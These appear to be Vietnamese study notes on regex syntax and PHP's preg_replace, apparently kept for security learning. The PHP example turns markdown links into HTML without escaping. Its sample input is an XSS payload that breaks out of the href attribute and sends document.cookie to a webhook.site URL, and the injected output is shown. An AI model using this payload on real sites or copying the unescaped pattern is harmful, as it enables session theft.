## reference
https://blog.csdn.net/SJunTe/article/details/89637192

https://www.runoob.com/regexp/regexp-intro.html

## Lý thuyết

| Ký tự | Mô tả | Ví dụ |
|---|---|---|
| `[]` | Khớp với một ký tự bất kỳ nằm trong tập ký tự được chỉ định. | `[a-m]` |
| `\` | Bắt đầu một chuỗi đặc biệt hoặc dùng để escape ký tự đặc biệt. | `\d` |
| `.` | Khớp với một ký tự bất kỳ, ngoại trừ ký tự xuống dòng `\n` (theo mặc định). | `he..o` |
| `^` | Khớp với vị trí bắt đầu chuỗi. | `^hello` |
| `$` | Khớp với vị trí kết thúc chuỗi. | `planet$` |
| `*` | Khớp với 0 hoặc nhiều lần xuất hiện của phần tử đứng trước. | `he.*o` |
| `+` | Khớp với 1 hoặc nhiều lần xuất hiện của phần tử đứng trước. | `he.+o` |
| `?` | Khớp với 0 hoặc 1 lần xuất hiện của phần tử đứng trước. | `he.?o` |
| `{n}` | Khớp với chính xác n lần xuất hiện của phần tử đứng trước. | `he.{2}o` |
| `\|` | Toán tử OR, khớp với một trong các biểu thức. | `falls|stays` |
| `()` | Nhóm các biểu thức và tạo nhóm bắt (capturing group). | `(abc)+` |
| `\s` | Khớp với ký tự khoảng trắng (space, tab, xuống dòng...). | `\s` |
| `\w` | Khớp với ký tự chữ, số hoặc dấu gạch dưới; trong chế độ ASCII tương đương `[a-zA-Z0-9_]`. | `\w+` |
| `\d` | Khớp với ký tự chữ số; trong chế độ ASCII tương đương `[0-9]`. | `\d+` |
| `\S` | Khớp với ký tự không phải khoảng trắng. | `\S+` |
| `\W` | Khớp với ký tự không thuộc nhóm word character. | `\W+` |
| `\D` | Khớp với ký tự không phải chữ số. | `\D+` |
| `{n,m}` | Khớp từ n đến m lần xuất hiện. | `a{2,5}` |
| `[^abc]` | Khớp với một ký tự không thuộc tập được chỉ định. | `[^abc]` |
|`\` |dùng để  Escape kí tự đặc biệt|các kí tự đặc biệt . ^ $ * + ? { } [ ] \ | ( )|
| `.`| khớp với một kí tự bất kì trừ newline|
|`()` |góm nhóm các biểu thức và lưu lại kết quả khớp|
| `(?: ):`|Gom nhóm nhưng không lưu kết quả vào một nhóm bắt riêng |
| `(?=...)`|Phía sau phải có pattern chỉ định | 
| `(?!...)`| Phía sau không được có pattern chỉ định|
| `(?<=...)`|Phía trước phải có pattern chỉ định |
| `(?<!...)`|Phía trước không được có pattern chỉ định |

## các hàm regex ở các ngôn ngữ
### PHP
`preg_replace(patterns, replacements, input, limit, count)` :nếu ở regex không chỉ định modifier `s` thì nó sẽ tự đồng duyệt từng dòng.

Ví dụ: 
```php
preg_replace('/\[(.*?)\]\((.*?)\)/', "<a href='$2'>$1</a>", $content);
```

nếu truyền vào
```
[quandz](#' id='CONFIG' )
[quandz1](#' id='CONFIG'  name='debug' )
[quandz2](javascript:location=`https://webhook.site/ff5cb011-604b-4a33-8f15-28450e5dcb9d?cookies=` + document.cookie'  id='CONFIG' name='main' )
```
nó sẽ duyệt qua từng dòng rồi xử lý vì không chỉ định odifier `s`.
kết quả trả về
```html
<a href='#' id='CONFIG' '>quandz</a>
<a href='#' id='CONFIG'  name='debug' '>quandz1</a>
<a href='javascript:location=`https://webhook.site/ff5cb011-604b-4a33-8f15-28450e5dcb9d?cookies=` + document.cookie'  id='CONFIG' name='main' '>quandz2</a>
```

